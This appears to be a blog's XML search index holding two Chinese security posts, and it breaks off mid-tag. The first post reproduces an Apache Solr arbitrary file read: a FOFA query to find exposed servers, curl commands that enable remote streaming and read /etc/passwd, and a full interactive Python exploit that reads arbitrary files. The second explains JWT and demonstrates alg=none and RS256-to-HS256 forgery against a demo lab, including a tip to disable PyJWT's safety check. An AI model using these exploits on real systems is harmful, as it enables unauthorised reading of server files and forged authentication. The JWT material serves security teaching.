<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>漏洞复现-Apache Solr 任意文件读取漏洞</title>
    <link href="/2021/03/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/03/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  这周在hw，水一篇文章，记录一下漏洞利用，当一个合格的脚本小子</p></blockquote><h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>由于Apache Solr默认安装时未开启身份验证，导致未经身份验证的攻击者可利用Config API打开requestDispatcher.requestParsers.enableRemoteStreaming开关，从而使攻击者可以在未授权的情况下获取目标服务器敏感文件。</p><blockquote><p>  听说报给官方后，官方拒绝修复，认为这不是一个漏洞，比一些src还离谱，人家起码会给个内部已知:eyes:</p></blockquote><h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><center>Apache Solr <= 8.8.1（全版本）</center> <h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>fofa 语法：<code>app=&quot;Solr&quot;</code></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210318204223.png" alt="image-20210318195353083"></p><h4 id="3-1-获取-core-name，拼接url"><a href="#3-1-获取-core-name，拼接url" class="headerlink" title="3.1 获取 core name，拼接url"></a>3.1 获取 core name，拼接url</h4><p><code>http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json</code></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210318204233.png" alt="image-20210318195317802"></p><p>Core name为：<code>arabnews</code>，那么使用的url 为 <code>http://xxx.xxx.xxx.xxx/solr/arabnews/config</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -d <span class="hljs-string">&#x27;&#123;  &quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27;</span> http://xxx.xxx.xxx.xxx/solr/arabnews/config -H <span class="hljs-string">&#x27;Content-type:application/json&#x27;</span><br></code></pre></td></tr></table></figure><p>继续使用 core name 拼接 <code>http://xxx.xxx.xxx.xxx/solr/arabnews/debug/dump?param=ContentStreams</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://xxx.xxx.xxx.xxx/solr/arabnews/debug/dump?param=ContentStreams&quot;</span> -F <span class="hljs-string">&quot;stream.url=file:///etc/passwd&quot;</span><br></code></pre></td></tr></table></figure><h4 id="3-2-攻击"><a href="#3-2-攻击" class="headerlink" title="3.2 攻击"></a>3.2 攻击</h4><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210318204248.png" alt="image-20210318200603145"></p><h2 id="0x04-漏洞POC"><a href="#0x04-漏洞POC" class="headerlink" title="0x04  漏洞POC"></a>0x04  漏洞POC</h2><p>PeiQi文库的大佬已经写好了，我改了一点小毛病，读取完返回的值不一定是json，我复现的时候就遇到了这个问题，将json处理删掉了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment"># @Author : PeiQi</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> requests.packages.urllib3.exceptions <span class="hljs-keyword">import</span> InsecureRequestWarning<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">title</span>():</span><br>    print(<span class="hljs-string">&#x27;+------------------------------------------&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;+  \033[34mGithub : https://github.com/PeiQi0        \033[0m&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;+  \033[34m公众号  : PeiQi文库                        \033[0m&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;+  \033[34mVersion: Apache Solr &lt; 8.2.0            \033[0m&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;+  \033[36m使用格式: python3 CVE-2019-0193.py       \033[0m&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:8983  \033[0m&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;+  \033[36mFile   &gt;&gt;&gt; 文件名称或目录                  \033[0m&#x27;</span>)<br>    print(<span class="hljs-string">&#x27;+------------------------------------------&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_1</span>(<span class="hljs-params">target_url</span>):</span><br>    core_url = target_url + <span class="hljs-string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        response = requests.request(<span class="hljs-string">&quot;GET&quot;</span>, url=core_url, timeout=<span class="hljs-number">10</span>)<br>        core_name = <span class="hljs-built_in">list</span>(json.loads(response.text)[<span class="hljs-string">&quot;status&quot;</span>])[<span class="hljs-number">0</span>]<br>        print(<span class="hljs-string">&quot;\033[32m[o] 成功获得core_name,Url为：&quot;</span> + target_url + <span class="hljs-string">&quot;/solr/&quot;</span> + core_name + <span class="hljs-string">&quot;/config\033[0m&quot;</span>)<br>        <span class="hljs-keyword">return</span> core_name<br>    <span class="hljs-keyword">except</span>:<br>        print(<span class="hljs-string">&quot;\033[31m[x] 目标Url漏洞利用失败\033[0m&quot;</span>)<br>        sys.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_2</span>(<span class="hljs-params">target_url, core_name</span>):</span><br>    vuln_url = target_url + <span class="hljs-string">&quot;/solr/&quot;</span> + core_name + <span class="hljs-string">&quot;/config&quot;</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;Content-type&quot;</span>:<span class="hljs-string">&quot;application/json&quot;</span><br>    &#125;<br>    data = <span class="hljs-string">&#x27;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>        response = requests.post(url=vuln_url, data=data, headers=headers, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">5</span>)<br>        print(<span class="hljs-string">&quot;\033[36m[o] 正在准备文件读取...... \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;responseHeader&quot;</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span> response.status_code == <span class="hljs-number">200</span>:<br>            print(<span class="hljs-string">&quot;\033[32m[o] 目标 &#123;&#125; 可能存在漏洞 \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url))<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&quot;\033[31m[x] 目标 &#123;&#125; 不存在漏洞\033[0m&quot;</span>.<span class="hljs-built_in">format</span>(target_url))<br>            sys.exit(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        print(<span class="hljs-string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_3</span>(<span class="hljs-params">target_url, core_name, File_name</span>):</span><br>    vuln_url = target_url + <span class="hljs-string">&quot;/solr/&#123;&#125;/debug/dump?param=ContentStreams&quot;</span>.<span class="hljs-built_in">format</span>(core_name)<br>    headers = &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    &#125;<br>    data = <span class="hljs-string">&#x27;stream.url=file://&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(File_name)<br>    <span class="hljs-keyword">try</span>:<br>        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)<br>        response = requests.post(url=vuln_url, data=data, headers=headers, verify=<span class="hljs-literal">False</span>, timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;No such file or directory&quot;</span> <span class="hljs-keyword">in</span> response.text:    <br>            print(<span class="hljs-string">&quot;\033[31m[x] 读取&#123;&#125;失败 \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(File_name))<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&quot;\033[36m[o] 响应为:\n&#123;&#125; \033[0m&quot;</span>.<span class="hljs-built_in">format</span>(response.text))<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        print(<span class="hljs-string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    title()<br>    target_url = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))<br>    core_name = POC_1(target_url)<br>    POC_2(target_url, core_name)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        File_name = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\033[35mFile &gt;&gt;&gt; \033[0m&quot;</span>))<br>        POC_3(target_url, core_name, File_name)<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210318204258.png" alt="image-20210318204216768"></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247484117&idx=1&sn=2fdab8cbe4b873f8dd8abb35d935d186&chksm=cecfaa8cf9b8239acbc83c363af62c41602cb167c485acc23a9850980044487585e6c408f632&scene=132#wechat_redirect">Apache Solr 任意文件读取漏洞 1Day</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初探JWT</title>
    <link href="/2021/03/05/%E5%88%9D%E6%8E%A2JWT/"/>
    <url>/2021/03/05/%E5%88%9D%E6%8E%A2JWT/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  当你迷茫时，就去学习新东西</p></blockquote><h1 id="初探JWT"><a href="#初探JWT" class="headerlink" title="初探JWT"></a>初探JWT</h1><h2 id="0x01-什么是JWT"><a href="#0x01-什么是JWT" class="headerlink" title="0x01 什么是JWT"></a>0x01 什么是JWT</h2><p><strong>JWT</strong> 全称为 <strong>JSON Web Tokens</strong> ，是为了在网络应用环境间传递声明而执行的一种基于JSON 的开放标准 (RFC 7519)，该 token 被设计为紧凑且安全的，它的两大使用场景是：认证和数据交换，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p><h2 id="0x02-JWT组成"><a href="#0x02-JWT组成" class="headerlink" title="0x02 JWT组成"></a>0x02 JWT组成</h2><p>一个JWT实际上就是一个字符串，它由三部分组成，<strong>头部</strong>、<strong>载荷</strong>与<strong>签名</strong>，中间用 <code>.</code> 分隔，例如：<code>xxxxx.yyyyy.zzzzz</code></p><h4 id="2-1-头部-header"><a href="#2-1-头部-header" class="headerlink" title="2.1 头部(header)"></a>2.1 头部(header)</h4><p>头部通常由两部分组成：令牌的类型（即 JWT）和正在使用的签名算法（如 HMAC SHA256 或 RSA.）。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;alg&quot;</span>: <span class="hljs-string">&quot;HS256&quot;</span>,<br>  <span class="hljs-attr">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后用 <code>Base64url</code> 编码得到头部，即 <code>xxxxx</code>。</p><blockquote><p>  <strong>Base64URL算法</strong></p><p>  该算法和常见Base64算法类似，稍有差别。Base64中用的三个字符是”+”，”/“和”=”，由于在URL中有特殊含义，因此Base64URL中对他们做了替换：”=”去掉，”+”用”-“替换，”/“用”_”替换，这就是Base64URL算法。</p></blockquote><h4 id="2-2-载荷-Payload"><a href="#2-2-载荷-Payload" class="headerlink" title="2.2 载荷(Payload)"></a>2.2 载荷(Payload)</h4><p>载荷中放置了 <code>token</code> 的一些基本信息，以帮助接收它的服务器来理解这个 <code>token</code>。同时还可以包含一些自定义的信息。</p><p>JWT 官方规定了7个，也就是预定义（Registered claims）的载荷，供选用。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;sub&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>  <span class="hljs-attr">&quot;iss&quot;</span>: <span class="hljs-string">&quot;http://localhost:8000/auth/login&quot;</span>,<br>  <span class="hljs-attr">&quot;iat&quot;</span>: <span class="hljs-number">1451888119</span>,<br>  <span class="hljs-attr">&quot;exp&quot;</span>: <span class="hljs-number">1454516119</span>,<br>  <span class="hljs-attr">&quot;nbf&quot;</span>: <span class="hljs-number">1451888119</span>,<br>  <span class="hljs-attr">&quot;jti&quot;</span>: <span class="hljs-string">&quot;37c107e4609ddbcc9c096ea5ee76c667&quot;</span>, <br>  <span class="hljs-attr">&quot;aud&quot;</span>: <span class="hljs-string">&quot;dev&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>  sub (subject)：主题</p><p>  iss (issuer)：签发人</p><p>  iat (Issued At)：签发时间</p><p>  exp (expiration time)：过期时间</p><p>  nbf (Not Before)：生效时间</p><p>  jti (JWT ID)：编号</p><p>  aud (audience)：受众</p></blockquote><p>除了以上字段之外，你完全可以添加自己想要的任何字段，这里还是提醒一下，由于JWT的标准，信息是不加密的，所以一些敏感信息最好不要添加到json里面</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;Name&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-attr">&quot;Age&quot;</span>:<span class="hljs-number">18</span><br>&#125;<br></code></pre></td></tr></table></figure><p>将上面的 <code>json</code> 进行 <code>Base64url</code> 编码得到载荷，即 <code>yyyyy</code>。</p><h4 id="2-3-签名-Signature"><a href="#2-3-签名-Signature" class="headerlink" title="2.3 签名(Signature)"></a>2.3 签名(Signature)</h4><p>签名时需要用到编码过的header、编码过的payload、一个秘钥（这个秘钥只有服务端知道），签名算法是header中指定的那个，如果以 <code>HMACSHA256</code> 加密，就如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">HMACSHA256(<br>  base64UrlEncode(header) + &quot;.&quot; +<br>  base64UrlEncode(payload),<br>  secret)<br></code></pre></td></tr></table></figure><p>加密后再进行 <code>Base64url</code> 编码最后得到的字符串就是 <code>token</code> 的第三部分 <code>zzzzz</code>。</p><p>组合便可以得到 <code>token：xxxxx.yyyyy.zzzzz</code>。</p><p>签名的作用：保证 JWT 没有被篡改过，原理如下：</p><blockquote><p>  HMAC 算法是不可逆算法，类似 MD5 和 hash ，但多一个密钥，密钥（即上面的 secret）由服务端持有，客户端把 token 发给服务端后，服务端可以把其中的头部和载荷再加上事先的 secret 再进行一次 HMAC 加密，得到的结果和 token 的第三段进行对比，如果一样则表明数据没有被篡改。</p><p>  注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。</p></blockquote><p>看一张图就明白了：<a href="https://jwt.io/">https://jwt.io/</a></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210305142735.png" alt="image-20210305142629387"></p><h2 id="0x03-渗透测试中的JWT"><a href="#0x03-渗透测试中的JWT" class="headerlink" title="0x03 渗透测试中的JWT"></a>0x03 渗透测试中的JWT</h2><h4 id="3-1-敏感信息泄露"><a href="#3-1-敏感信息泄露" class="headerlink" title="3.1 敏感信息泄露"></a>3.1 敏感信息泄露</h4><p>显然，由于有效载荷是以明文(<code>Base64url</code>只是一种编码方式)形式传输的，因此，如果有效载荷中存在敏感信息的话，就会发生信息泄露。</p><h4 id="3-2-将签名算法改为none"><a href="#3-2-将签名算法改为none" class="headerlink" title="3.2 将签名算法改为none"></a>3.2 将签名算法改为none</h4><p>签名算法可以确保JWT在传输过程中不会被恶意用户所篡改，但头部中的<code>alg</code>字段却可以改为<code>none</code>。</p><p>另外，一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。</p><p>将alg字段改为none后，系统就会从JWT中删除相应的签名数据（这时，JWT就会只含有头部 + ‘.’ + 有效载荷 + ‘.’），然后将其提交给服务器。</p><p>靶场：<a href="https://github.com/Sjord/jwtdemo/">https://github.com/Sjord/jwtdemo/</a></p><p>以 <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a> 靶场作为实验</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210305170239.png" alt="image-20210305164337558"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxNDkzMzgwMywiZXhwIjoxNjE0OTM1MDAzLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.leCmAQCAuPZiAnnZLj6yUvL2WJ2R9oXZAgvtg04cRC8<br></code></pre></td></tr></table></figure><p>如图，当前 jwt 指定的 alg 为 HS256 算法</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210305170247.png" alt="image-20210305164732797"></p><p>取出JWT中的头部<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</code>解码后，将算法<code>HS256</code>改为<code>none</code>,再使用<code>Base64url</code>编码，结果为 <code>ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0</code> ，将结果替换原始的header，再加上自己修改好的载荷(payload)，然后删除签名，但<strong>保留最后一个点</strong>，将其发送到演示页面，看 server 端是否接受 none 算法，从而绕过了算法签名。</p><blockquote><p>  <a href="https://jwt.io/">https://jwt.io/</a> 将 alg 为 none 视为恶意行为，所以，无法通过在线工具生成 JWT, 可以自己用<code>Base64url</code>编码后组合，也可以使用下面代码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apl">#!&#x2F;usr&#x2F;bin&#x2F;python3<br># -*- coding:utf-8 -*-<br># @Author : yhy<br>import jwt<br><br>print(jwt.encode(&#123;<br>&quot;iss&quot;: &quot;http:&#x2F;&#x2F;demo.sjoerdlangkemper.nl&#x2F;&quot;,<br>&quot;iat&quot;: 1614933803,<br>&quot;exp&quot;: 1614935003,<br>&quot;data&quot;: &#123;<br>&quot;hello&quot;: &quot;world&quot;<br>&#125;<br>&#125;, key&#x3D;&#39;&#39;, algorithm&#x3D;&#39;none&#39;))<br></code></pre></td></tr></table></figure><blockquote><p>另外，某些 JWT 实现对大小写敏感，所以，当none不通过时，可以继续尝试 None、nOne、NONE等等。上述代码只支持none，其它的请自行使用<code>Base64url</code>编码。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxNDkzMzgwMywiZXhwIjoxNjE0OTM1MDAzLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.<br></code></pre></td></tr></table></figure><p>攻击成功</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210305170252.png" alt="image-20210305170222663"></p><h4 id="3-3-非对称加密向下降级为对称加密（将RS256算法改为HS256）"><a href="#3-3-非对称加密向下降级为对称加密（将RS256算法改为HS256）" class="headerlink" title="3.3 非对称加密向下降级为对称加密（将RS256算法改为HS256）"></a>3.3 非对称加密向下降级为对称加密（将RS256算法改为HS256）</h4><p>现在大多数应用使用的算法方案都采用 RSA 非对称加密，server 端保存私钥，用来签发 jwt，对传回来的 jwt 使用公钥解密验证。</p><p>如果后端的验证是根据header的alg选择算法，并且支持 HS256 对称加密算法， 碰到这种情况，我们可以修改 alg 为 HS256 对称加密算法，然后使用我们可以获取到的公钥作为 key 进行签名加密（ps：在靶场中我们是直接获取，在实战中，如果是对客户进行服务的话，我们可以让客户提供公钥，毕竟只是一个公钥，为了详细测出系统漏洞，这应该是被允许的，另一个可能的来源是服务器的TLS证书，从证书中导出公钥），这样一来，当我们将 jwt 传给 server 端的时候，server 端因为默认使用的是公钥解密，而算法为修改后的 HS256 对称加密算法，此时即不存在公钥私钥问题，因为对称密码算法只有一个key，所以肯定可以正常解密解析，从而绕过了算法限制。</p><p>当 server 端严格指定只允许使用 HMAC 或者 RSA 算法其中一种时候，那这种攻击手段是没有效果的。</p><p>使用靶场进行此次攻击 <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php</a> 这是<code>RS256</code>加密</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306151931.png" alt="image-20210306151929356"></p><p>从源码中，我们也可以看到它需要一个RS256签名，但也接受一个HS256签名。</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306151650.png" alt="image-20210306151610286"></p><p>靶场的公钥获取：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem">http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem</a> </p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210305172816.png" alt="image-20210305172812817"></p><p>将公钥保存为<code>public.pem</code>，<strong>一定要在最后空一行</strong>、<strong>一定要在最后空一行</strong>、<strong>一定要在最后空一行</strong>，重要的事情说三遍</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152239.png" alt="image-20210306151222844"></p><p>运行脚本（打靶场时请将{…}中的值修改，如果您现在提交，它将失败，因为它已经过期）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment"># @Author : yhy</span><br><span class="hljs-comment"># jwt 非对称加密，改为对称加密 ，需要公钥</span><br><span class="hljs-keyword">import</span> jwt<br><br>public = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;public.pem&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read() <span class="hljs-comment"># 公钥</span><br>print(jwt.encode(&#123;<br>  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;http://demo.sjoerdlangkemper.nl/&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1615015143</span>,<br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1615016343</span>,<br>  <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;JWT&quot;</span>: <span class="hljs-string">&quot;RS256 -&gt; HS256 test &quot;</span><br>  &#125;<br>&#125;, key=public, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>))<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">python3 -m pip install PyJWT<br>python3 jwt_test.py<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152213.png" alt="image-20210305211926691"></p><p>如果出现以上错误，请执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apl">python3 -m pip uninstall jwt<br>python3 -m pip uninstall PyJWT<br>python3 -m pip install PyJWT<br></code></pre></td></tr></table></figure><p>运行</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152614.png" alt="image-20210305213239054"></p><p>查资料说是因为jwt模块更新后，为了防止滥用，加入了强校验，如果指定算法为 HS256 而提供 RSA 的公钥作为 key 时会报错，无法往下执行，需要注释掉 <strong>site-packages/jwt/algorithms.py</strong> 中的如下五行：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152610.png" alt="image-20210305213418057"></p><p>成功运行</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152104.png" alt="image-20210306152103157"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 